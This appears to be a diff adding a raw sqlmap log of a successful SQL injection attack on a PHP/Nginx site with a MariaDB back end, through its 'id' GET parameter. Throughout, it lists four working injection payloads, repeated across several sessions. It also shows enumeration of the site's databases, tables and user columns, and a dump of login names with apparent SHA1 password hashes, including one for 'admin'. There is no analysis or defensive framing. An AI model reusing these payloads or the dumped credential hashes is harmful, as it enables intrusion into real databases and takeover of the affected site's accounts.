@@ -1,0 +1,217 @@
+sqlmap identified the following injection point(s) with a total of 122 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: id=-1437 OR 3189=3189#&pid=64
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=98 AND (SELECT 5541 FROM(SELECT COUNT(*),CONCAT(0x717a706271,(SELECT (ELT(5541=5541,1))),0x71767a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)&pid=64
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=98 AND (SELECT 9614 FROM (SELECT(SLEEP(5)))IqxQ)&pid=64
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 20 columns
+    Payload: id=98 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a706271,0x644b796d5759784a6679436b506b51726e6b70767a794c6a4e7773466d465a4e6876586774416a68,0x71767a6b71),NULL,NULL,NULL,NULL-- -&pid=64
+---
+web application technology: PHP 7.4.33, Nginx
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: id=-1437 OR 3189=3189#&pid=64
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=98 AND (SELECT 5541 FROM(SELECT COUNT(*),CONCAT(0x717a706271,(SELECT (ELT(5541=5541,1))),0x71767a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)&pid=64
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=98 AND (SELECT 9614 FROM (SELECT(SLEEP(5)))IqxQ)&pid=64
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 20 columns
+    Payload: id=98 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a706271,0x644b796d5759784a6679436b506b51726e6b70767a794c6a4e7773466d465a4e6876586774416a68,0x71767a6b71),NULL,NULL,NULL,NULL-- -&pid=64
+---
+web application technology: PHP 7.4.33, Nginx
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+available databases [4]:
+[*] information_schema
+[*] revel
+[*] test
+[*] test_demo
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: id=-1437 OR 3189=3189#&pid=64
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=98 AND (SELECT 5541 FROM(SELECT COUNT(*),CONCAT(0x717a706271,(SELECT (ELT(5541=5541,1))),0x71767a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)&pid=64
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=98 AND (SELECT 9614 FROM (SELECT(SLEEP(5)))IqxQ)&pid=64
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 20 columns
+    Payload: id=98 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a706271,0x644b796d5759784a6679436b506b51726e6b70767a794c6a4e7773466d465a4e6876586774416a68,0x71767a6b71),NULL,NULL,NULL,NULL-- -&pid=64
+---
+web application technology: PHP 7.4.33, Nginx
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+Database: revel
+[14 tables]
++----------------------+
+| album                |
+| album_cate           |
+| attachment           |
+| banner               |
+| calendar             |
+| calendar_cate        |
+| calendar_desc        |
+| calendar_pdf         |
+| news                 |
+| news_cate            |
+| usr                  |
+| verse                |
+| webpage_content      |
+| webpage_content_desc |
++----------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: id=-1437 OR 3189=3189#&pid=64
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=98 AND (SELECT 5541 FROM(SELECT COUNT(*),CONCAT(0x717a706271,(SELECT (ELT(5541=5541,1))),0x71767a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)&pid=64
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=98 AND (SELECT 9614 FROM (SELECT(SLEEP(5)))IqxQ)&pid=64
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 20 columns
+    Payload: id=98 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a706271,0x644b796d5759784a6679436b506b51726e6b70767a794c6a4e7773466d465a4e6876586774416a68,0x71767a6b71),NULL,NULL,NULL,NULL-- -&pid=64
+---
+web application technology: Nginx, PHP 7.4.33
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+Database: revel
+Table: usr
+[24 columns]
++--------------------+---------------+
+| Column             | Type          |
++--------------------+---------------+
+| usr_crt_dt         | timestamp     |
+| usr_crt_ip         | varchar(32)   |
+| usr_crt_usr_id     | int(11)       |
+| usr_email          | varchar(200)  |
+| usr_fixed          | enum('Y','N') |
+| usr_id             | int(11)       |
+| usr_last_login_dt  | datetime      |
+| usr_last_login_ip  | varchar(32)   |
+| usr_login_fail_ct  | int(11)       |
+| usr_login_fail_dt  | datetime      |
+| usr_login_fail_ip  | varchar(32)   |
+| usr_login_name     | varchar(32)   |
+| usr_lv             | int(11)       |
+| usr_mod_dt         | datetime      |
+| usr_mod_ip         | varchar(32)   |
+| usr_mod_usr_id     | int(11)       |
+| usr_name           | varchar(32)   |
+| usr_pwd            | varchar(40)   |
+| usr_pwd_mod_dt     | decimal(10,0) |
+| usr_pwd_mod_ip     | varchar(32)   |
+| usr_pwd_mod_usr_id | int(11)       |
+| usr_sort_id        | int(11)       |
+| usr_sort_lv        | int(11)       |
+| usr_st             | varchar(4)    |
++--------------------+---------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: id=-1437 OR 3189=3189#&pid=64
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=98 AND (SELECT 5541 FROM(SELECT COUNT(*),CONCAT(0x717a706271,(SELECT (ELT(5541=5541,1))),0x71767a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)&pid=64
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=98 AND (SELECT 9614 FROM (SELECT(SLEEP(5)))IqxQ)&pid=64
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 20 columns
+    Payload: id=98 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a706271,0x644b796d5759784a6679436b506b51726e6b70767a794c6a4e7773466d465a4e6876586774416a68,0x71767a6b71),NULL,NULL,NULL,NULL-- -&pid=64
+---
+web application technology: PHP 7.4.33, Nginx
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+Database: revel
+Table: usr
+[5 entries]
++----------------+------------------------------------------+
+| usr_login_name | usr_pwd                                  |
++----------------+------------------------------------------+
+| SystemCreate   | NULL                                     |
+| UserModify     | NULL                                     |
+| Init           | NULL                                     |
+| easttech       | a8372857cda513645e8e8494badc0db4aba94972 |
+| admin          | afbf4681fe8c7352b21c09187b4be6a09574afdb |
++----------------+------------------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: id=-1437 OR 3189=3189#&pid=64
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=98 AND (SELECT 5541 FROM(SELECT COUNT(*),CONCAT(0x717a706271,(SELECT (ELT(5541=5541,1))),0x71767a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)&pid=64
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=98 AND (SELECT 9614 FROM (SELECT(SLEEP(5)))IqxQ)&pid=64
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 20 columns
+    Payload: id=98 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a706271,0x644b796d5759784a6679436b506b51726e6b70767a794c6a4e7773466d465a4e6876586774416a68,0x71767a6b71),NULL,NULL,NULL,NULL-- -&pid=64
+---
+web application technology: PHP 7.4.33, Nginx
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: id=-1437 OR 3189=3189#&pid=64
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=98 AND (SELECT 5541 FROM(SELECT COUNT(*),CONCAT(0x717a706271,(SELECT (ELT(5541=5541,1))),0x71767a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)&pid=64
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=98 AND (SELECT 9614 FROM (SELECT(SLEEP(5)))IqxQ)&pid=64
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 20 columns
+    Payload: id=98 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a706271,0x644b796d5759784a6679436b506b51726e6b70767a794c6a4e7773466d465a4e6876586774416a68,0x71767a6b71),NULL,NULL,NULL,NULL-- -&pid=64
+---
+web application technology: PHP 7.4.33, Nginx
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
